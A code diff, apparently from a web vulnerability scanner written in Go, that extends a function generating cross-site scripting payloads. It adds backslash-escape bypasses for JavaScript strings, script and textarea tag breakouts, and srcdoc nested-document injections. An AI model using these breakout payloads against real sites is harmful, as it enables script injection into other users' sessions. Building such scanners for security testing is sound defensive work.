@@ -131,16 +131,24 @@ func buildExecPayloads(a ReflectionAnalysis) []xssExecPayload {
 		} else if a.JSQuote == '`' {
 			direct[0] = xssExecPayload{"${" + xssAlert + "}", "", "${" + xssAlert}
 		}
+		if a.JSQuote != 0 && strings.Contains(a.Escaped, string(a.JSQuote)) && strings.Contains(a.Surviving, `\`) {
+			direct = append([]xssExecPayload{{`\` + direct[0].Payload, "", `\` + direct[0].Token}}, direct...)
+		}
 		if a.Quote != 0 {
 			direct = append(direct, prefixLadder(string(a.Quote)+`>`)...)
 		}
 		return direct
 	case CtxJSString:
 		// close the string/stmt then run; also </script> breakout into HTML text.
-		return append([]xssExecPayload{
+		direct := []xssExecPayload{
 			{`';` + xssAlert + `//`, "", `';` + xssAlert},
 			{`";` + xssAlert + `//`, "", `";` + xssAlert},
-		}, prefixLadder(`</script>`)...)
+		}
+		if a.JSQuote != 0 && strings.Contains(a.Escaped, string(a.JSQuote)) && strings.Contains(a.Surviving, `\`) {
+			payload := `\` + string(a.JSQuote) + `;` + xssAlert + `//`
+			direct = append([]xssExecPayload{{payload, "", `\` + string(a.JSQuote) + `;` + xssAlert}}, direct...)
+		}
+		return append(direct, prefixLadder(`</script>`)...)
 	case CtxJSExpr:
 		return append([]xssExecPayload{
 			{`;` + xssAlert + `//`, "", `;` + xssAlert},
@@ -149,12 +157,20 @@ func buildExecPayloads(a ReflectionAnalysis) []xssExecPayload {
 		return prefixLadder(`</style>`)
 	case CtxComment:
 		return prefixLadder(`-->`)
-	case CtxRCDATA:
+	case CtxRCDATA, CtxRAWTEXT:
 		close := a.CloseTag
 		if close == "" {
 			close = `</textarea>`
 		}
 		return prefixLadder(close)
+	case CtxSrcDoc:
+		// srcdoc is a nested document. Try direct nested markup first, then fall
+		// back to breaking the outer attribute when its quote survives.
+		ladder := htmlTextExecLadder()
+		if a.Quote != 0 {
+			ladder = append(ladder, prefixLadder(string(a.Quote)+`>`)...)
+		}
+		return ladder
 	default:
 		return htmlTextExecLadder()
 	}
